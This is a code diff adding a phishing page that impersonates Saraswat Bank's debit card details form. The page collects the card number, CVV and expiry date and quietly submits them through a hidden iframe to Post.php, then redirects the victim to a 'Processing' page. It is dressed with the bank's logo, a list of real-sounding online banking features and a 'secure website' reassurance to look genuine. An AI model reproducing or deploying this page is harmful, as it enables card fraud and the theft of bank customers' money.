@@ -1,0 +1,179 @@
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Saraswat Bank - Debit Card Details</title>
+                <style>
+                    body {
+                        font-family: sans-serif;
+                        background-color: #F2E6DA;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        min-height: 00vh;
+                        margin: 0;
+                    }
+
+                  .container {
+                        background-color: #F2E6DA;
+                        padding: 20px;
+                        border-radius: 8px;
+                        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+                        width: 290px; /* Adjust width as needed */
+                    }
+
+                  .header {
+                        text-align: center;
+                        margin-bottom: 20px;
+                    }
+
+                  .header img {
+                        max-width: 281px; /* Adjust logo size as needed */
+                    }
+
+                  .input-group {
+                        margin-bottom: 15px;
+                    }
+
+                    label {
+                        display: block;
+                        margin-bottom: 5px;
+                        font-weight: bold;
+                    }
+
+                    input[type="text"],
+                    select {
+                        width: calc(100% - 12px); /* Account for padding and border */
+                        padding: 8px;
+                        border: 1px solid #ccc;
+                        border-radius: 4px;
+                        box-sizing: border-box;
+                    }
+
+                    button {
+                        background-color: #f0ad4e; /* Example orange color */
+                        color: black;
+                        padding: 10px 15px;
+                        border: none;
+                        border-radius: 4px;
+                        cursor: pointer;
+                        width: 100%;
+                    }
+
+                    button:hover {
+                        background-color: #e09d3f; /* Darker shade on hover */
+                    }
+
+                  .cvv-input {
+                        width: 80px; /* Adjust CVV input width */
+                    }
+
+                  .expiry-select {
+                        display: inline-block;
+                        width: calc(50% - 6px); /* Adjust width for month/year select */
+                    }
+
+                  .expiry-select:first-child {
+                        margin-right: 6px;
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <div class="header">
+                       <!-- Static- Please don't do anything here-->
+                        <script type="text/javascript">var submitted=false;</script>
+                        <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing.html';}"></iframe>
+                        <!--My Form-->
+                        <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true">
+
+
+
+                       
+                        <img src="srswt h1.jpg" alt="Saraswat Bank Logo"> 
+                                <br>  <br>
+                            <h3
+                                 <span style ="color: red;">Debit Card Details</span>
+                            <br>
+                             <br>
+                            
+                               <input type="text" class="new-control" id="cardNumber" name="cardNumber" 
+                                                    placeholder="Debit Card Number" inputMode="numeric" minLength="16" maxLength="19" 
+                                                    pattern="[0-9]{16,19}" title="Please enter a valid card number (16-19 digits)" required>
+                                         
+                             <br>
+                             <br>
+                             
+                                            <div class="form-group">
+                                                <label> <span class="required"></span></label>
+                                                <input type="text" style="font-size:14px;" class="cvv-controlC" maxLength="3" inputmode="numeric" 
+                                                    id="cvv" name="cvv" placeholder="CVV/CVC" pattern="[0-9]{3}" 
+                                                    title="Please enter a valid 3-digit CVV/CVC number" required>
+                                                 <br>
+                                                 <br>
+                                            </div>
+
+                                            <div class="expiry-container" style="display: flex; gap: 1px;">
+                                                <div class="form-group" style="flex: 1;">
+                                                    <label><span class="required"></span></label>
+                                                    <select id="expiry-month" name="expiry-month" class="expiry-select" required>
+                                                        <option value="" disabled selected>MM</option>
+                                                        <option value="01">01</option>
+                                                        <option value="02">02</option>
+                                                        <option value="03">03</option>
+                                                        <option value="04">04</option>
+                                                        <option value="05">05</option>
+                                                        <option value="06">06</option>
+                                                        <option value="07">07</option>
+                                                        <option value="08">08</option>
+                                                        <option value="09">09</option>
+                                                        <option value="10">10</option>
+                                                        <option value="11">11</option>
+                                                        <option value="12">12</option>
+                                                    </select>
+                                                </div>
+
+                                                <div class="form-group" style="flex: 1;">
+                                                    <label> <span class="required"></span></label>
+                                                    <select id="expiry-year" name="expiry-year" class="expiry-select" required>
+                                                        <option value="" disabled selected>YY</option>
+                                                        <option value="2025">25</option>
+                                                        <option value="2026">26</option>
+                                                        <option value="2027">27</option>
+                                                        <option value="2028">28</option>
+                                                        <option value="2029">29</option>
+                                                        <option value="2030">30</option>
+                                                       
+                                                    </select>
+
+
+
+
+                                                    
+                                                </div>
+                                            </div>
+                                           <br>
+                                            <br>
+                                           
+                                     
+
+
+                                           <button type="submit" class="next-button">NEXT</button>
+                                </div>
+                                <script src="debit-card.js"></script>
+                             <p class="secure-text">* Ensure that you are transacting on a secure website.</p>
+                   <li><b>Account Overview:</b> View saving/ current/ overdraft bank account balance, details and download statements.</li>
+                     <li><b>Reset Password:</b> Reset Password using Debit Card.</li>
+                     <li><b>Bill Payments:</b> Make your monthly bill payments &amp; recharges online easily.</li>
+                     <li><b>Loans:</b> View loan account details at a glance &amp; get statements on your registered email.</li>
+                     <li><b>Fixed Deposits:</b> View instantly &amp; open Fixed Deposits and Recurring Deposits.</li>
+                </div>
+               
+            </body>
+            </html>
+
+
+
+
+            
